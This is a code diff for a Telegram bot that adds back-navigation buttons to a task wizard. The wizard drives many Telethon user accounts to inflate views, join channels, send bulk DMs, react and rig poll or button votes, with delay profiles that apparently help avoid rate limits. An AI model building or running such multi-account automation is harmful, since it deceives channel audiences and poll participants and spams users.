+            [InlineKeyboardButton(text=f"🌍 Universal System Accounts ({all_accounts})", callback_data="routing_scope:all")],
+            [InlineKeyboardButton(text="🔙 Return Back", callback_data="main_menu")]
         ]
         await callback.message.edit_text(
             f"👑 <b>Super Owner Operational Routing Console:</b>\nSelect source pool of target Telethon sessions to apply toward this campaign:",
@@ -1699,11 +1710,13 @@ async def handle_type_selection(callback: CallbackQuery, state: FSMContext):
         await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
     elif selected_task_type == "dm":
         text = "💬 <b>Enter the raw Direct DM message body text to dispatch:</b>"
-        await callback.message.edit_text(text, parse_mode="HTML")
+        buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_dm_text)
     elif selected_task_type in ["view", "join", "refer", "speed"]:
         text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>\n<i>(e.g., https://t.me/example, @example, or https://t.me/+AbCdEfGhIjKlMnOp)</i>"
-        await callback.message.edit_text(text, parse_mode="HTML")
+        buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_channel_link)
 
 @router.callback_query(F.data.startswith("leave_mode:"), StateFilter(TaskWizardStates.waiting_for_leave_choice))
@@ -1717,7 +1730,8 @@ async def handle_leave_choice(callback: CallbackQuery, state: FSMContext):
         await state.set_state(TaskWizardStates.waiting_for_speed_choice)
     else:
         text = "🔗 <b>Provide link/username of channel to leave:</b>"
-        await callback.message.edit_text(text, parse_mode="HTML")
+        buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_channel_link)
 
 async def prompt_for_emojis(message_obj: Any, selected_emojis: List[str]):
@@ -1757,14 +1771,16 @@ async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
         await state.set_state(TaskWizardStates.waiting_for_vote_mode_choice)
     else:
         text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>"
-        await callback.message.edit_text(text, parse_mode="HTML")
+        buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_channel_link)
 
 async def prompt_for_vote_mode(message_obj: Any):
     text = "🗳️ <b>Choose Poll or Inline Voting Framework Target:</b>"
     buttons = [
-        [InlineKeyboardButton(text="📊 Standard Native Telegram Poll", callback_data="vote_mode:poll", style="primary")],
-        [InlineKeyboardButton(text="🔘 Inline Keyboard Callback Button", callback_data="vote_mode:inline", style="primary")]
+        [InlineKeyboardButton(text="📊 Standard Native Telegram Poll", callback_data="vote_mode:poll")],
+        [InlineKeyboardButton(text="🔘 Inline Keyboard Callback Button", callback_data="vote_mode:inline")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
     ]
     if isinstance(message_obj, Message):
         await message_obj.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
@@ -1777,13 +1793,14 @@ async def handle_vote_mode_choice(callback: CallbackQuery, state: FSMContext):
     v_mode = callback.data.split(":")[1]
     await state.update_data(vote_mode=v_mode)
 
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
     if v_mode == "poll":
         text = "🔢 <b>Enter zero-based poll option index integer to vote for:</b>\n<i>(e.g., 0 for First Option, 1 for Second Option, etc.)</i>"
-        await callback.message.edit_text(text, parse_mode="HTML")
+        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_poll_option_index)
     else:
         text = "🔤 <b>Type exact button text label or emoji symbol on the inline button:</b>"
-        await callback.message.edit_text(text, parse_mode="HTML")
+        await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
         await state.set_state(TaskWizardStates.waiting_for_button_text)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_poll_option_index))
@@ -1794,7 +1811,8 @@ async def process_poll_index(message: Message, state: FSMContext):
         return
     await state.update_data(poll_option_index=int(val))
     text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>"
-    await message.answer(text, parse_mode="HTML")
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     await state.set_state(TaskWizardStates.waiting_for_channel_link)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
@@ -1802,7 +1820,8 @@ async def process_button_text(message: Message, state: FSMContext):
     btn_text = message.text.strip()
     await state.update_data(button_text=btn_text)
     text = "🔗 <b>Provide public/private target Telegram channel link or username:</b>"
-    await message.answer(text, parse_mode="HTML")
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     await state.set_state(TaskWizardStates.waiting_for_channel_link)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
@@ -1810,7 +1829,8 @@ async def process_dm_text(message: Message, state: FSMContext):
     dm_body = message.text.strip()
     await state.update_data(dm_text=dm_body)
     text = "🔗 <b>Provide public target user handle or ID to send message to:</b>"
-    await message.answer(text, parse_mode="HTML")
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+    await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     await state.set_state(TaskWizardStates.waiting_for_channel_link)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_channel_link))
@@ -1828,7 +1848,8 @@ async def process_channel_link(message: Message, state: FSMContext):
             await state.set_state(TaskWizardStates.waiting_for_speed_choice)
         else:
             text = "📍 <b>Provide target Telegram message post link:</b>\n<i>(e.g. https://t.me/channel/123 or https://t.me/c/12345/678)</i>"
-            await message.answer(text, parse_mode="HTML")
+            buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+            await message.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
             await state.set_state(TaskWizardStates.waiting_for_post_link)
     else:
         await prompt_for_speed(message)
@@ -1844,9 +1865,10 @@ async def process_post_link(message: Message, state: FSMContext):
 async def prompt_for_speed(message_obj: Any):
     text = "🏎️ <b>Choose Task Execution Delay Profile:</b>"
     buttons = [
-        [InlineKeyboardButton(text="⚡ Safer (2.5s Delay)", callback_data="speed_mode:safer", style="success")],
-        [InlineKeyboardButton(text="🛡️ Safe Mode (5.0s Delay)", callback_data="speed_mode:safe", style="primary")],
-        [InlineKeyboardButton(text="🚀 Fastest Speed (0.05s Delay)", callback_data="speed_mode:fastest", style="danger")]
+        [InlineKeyboardButton(text="⚡ Safer (2.5s Delay)", callback_data="speed_mode:safer")],
+        [InlineKeyboardButton(text="🛡️ Safe Mode (5.0s Delay)", callback_data="speed_mode:safe")],
+        [InlineKeyboardButton(text="🚀 Fastest Speed (0.05s Delay)", callback_data="speed_mode:fastest")],
+        [InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]
     ]
     if isinstance(message_obj, Message):
         await message_obj.answer(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
@@ -1883,7 +1905,8 @@ async def handle_speed_choice(callback: CallbackQuery, state: FSMContext):
         })
 
     text = f"🔢 <b>Type count of accounts to run on this task:</b>\n<i>(Available active operational accounts: <code>{max_avail}</code>)</i>"
-    await callback.message.edit_text(text, parse_mode="HTML")
+    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="task_hub_start")]]
+    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
     await state.set_state(TaskWizardStates.waiting_for_account_scale)
 
 @router.message(StateFilter(TaskWizardStates.waiting_for_account_scale))
@@ -1974,7 +1997,7 @@ async def view_active_tasks(callback: CallbackQuery, bot: Bot):
             icon = "🟢" if st == "COMPLETED" else ("🟡" if st == "RUNNING" else "🔴")
             text += f"{icon} <b>Task #{r['task_id']}</b> [{r['task_type'].upper()}]\nStatus: <b>{st}</b> | Progress: <code>{r.get('progress', '0%')}</code>\n\n"
 
-    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")]]
+    buttons = [[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 # --- REFERRAL NETWORK HOOKS ---
@@ -1991,7 +2014,7 @@ async def view_referrals_menu(callback: CallbackQuery, bot: Bot):
         f"Your Personal Referral Link:\n<code>{ref_link}</code>\n\n"
         f"👥 Total Invited Active Users: <code>{ref_count}</code>"
     )
-    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
+    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 # --- ADMINISTRATIVE TELEMETRY METRICS ---
@@ -2026,8 +2049,8 @@ async def view_admin_panel(callback: CallbackQuery, bot: Bot):
     )
 
     buttons = [
-        [InlineKeyboardButton(text="💾 Check DB Storage Metrics", callback_data="check_db_storage", style="primary")],
-        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]
+        [InlineKeyboardButton(text="💾 Check DB Storage Metrics", callback_data="check_db_storage")],
+        [InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]
     ]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
@@ -2047,7 +2070,7 @@ async def view_system_stats(callback: CallbackQuery, bot: Bot):
         acc_cnt = await db_mgr.db.accounts.count_documents({"user_id": u['user_id']})
         text += f"• <code>{u['user_id']}</code> (@{u.get('username', 'None')}) ➜ Role: <b>{u.get('role', 'user').upper()}</b> | Accounts: <code>{acc_cnt}</code>\n"
 
-    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
+    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu")]]
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
 
 # --- INITIALIZATION ENGINE ENTRYPOINT ---
